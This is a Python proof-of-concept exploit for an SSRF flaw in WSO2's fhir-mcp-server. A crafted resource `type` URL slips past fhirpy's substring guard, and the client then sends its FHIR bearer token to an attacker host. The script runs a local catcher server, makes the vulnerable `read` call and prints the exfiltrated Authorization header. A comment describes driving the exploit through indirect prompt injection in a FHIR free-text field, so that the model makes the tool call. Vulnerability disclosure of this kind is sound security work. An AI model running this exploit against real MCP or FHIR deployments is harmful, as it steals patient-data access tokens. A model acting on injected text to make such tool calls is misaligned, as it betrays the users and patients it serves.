"""
PoC: WSO2 fhir-mcp-server — bearer-token / PHI exfiltration via unvalidated `type`.

WSO2's read/create/update tools pass the LLM-supplied `type` straight into
    client.resource(resource_type=type, id=id).execute(operation=..., method="GET", ...)
with only a non-empty check. fhirpy builds the request URL as `{type}/{id}/{operation}`
and its ONLY anti-SSRF guard (`_build_request_url`) is a SUBSTRING check:
`if self.url in path: return path`. So an absolute-URL `type` that merely CONTAINS the
configured FHIR base URL (e.g. in a query string) is sent verbatim — WITH the
`Authorization: Bearer <FHIR access token>` header — to an attacker-controlled host.

This faithfully replicates the server-side call in
  src/fhir_mcp_server/server.py  (the `read` tool, ~line 400).
"""
import asyncio
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

from fhirpy import AsyncFHIRClient

ATTACKER_PORT = 8899
FHIR_BASE = "http://127.0.0.1:9911/fhir/r4"   # the victim deployment's configured FHIR base
STOLEN = {}

class Catch(BaseHTTPRequestHandler):
    def do_GET(self):
        STOLEN["path"] = self.path
        STOLEN["authorization"] = self.headers.get("Authorization")
        STOLEN["host"] = self.headers.get("Host")
        self.send_response(200); self.send_header("Content-Type", "application/fhir+json"); self.end_headers()
        self.wfile.write(b'{"resourceType":"Bundle","entry":[]}')
    def log_message(self, *a):  # silence
        pass

def serve():
    HTTPServer(("127.0.0.1", ATTACKER_PORT), Catch).serve_forever()

async def main():
    threading.Thread(target=serve, daemon=True).start()
    await asyncio.sleep(0.3)

    # The MCP server, once OAuth'd to the FHIR server, holds this bearer token:
    client = AsyncFHIRClient(url=FHIR_BASE, authorization="Bearer SECRET-PHI-ACCESS-TOKEN")

    # Attacker-influenced `type` (via the LLM tool call, e.g. indirect prompt injection in a
    # FHIR free-text field). It is an absolute URL that CONTAINS the base url as a query param,
    # so fhirpy's `self.url in path` substring guard passes.
    malicious_type = f"http://127.0.0.1:{ATTACKER_PORT}/steal?leak={FHIR_BASE}"

    # === exact WSO2 `read` tool call ===
    try:
        await client.resource(resource_type=malicious_type, id="1").execute(
            operation="", method="GET", params={}
        )
    except Exception as e:
        print("call raised (does not matter, request already sent):", type(e).__name__)

    print("\n--- attacker server received ---")
    print("Host        :", STOLEN.get("host"))
    print("Path        :", STOLEN.get("path"))
    print("Authorization:", STOLEN.get("authorization"))
    leaked = STOLEN.get("authorization") == "Bearer SECRET-PHI-ACCESS-TOKEN"
    print("\n>>> TOKEN EXFILTRATED TO ATTACKER HOST:", leaked)

asyncio.run(main())
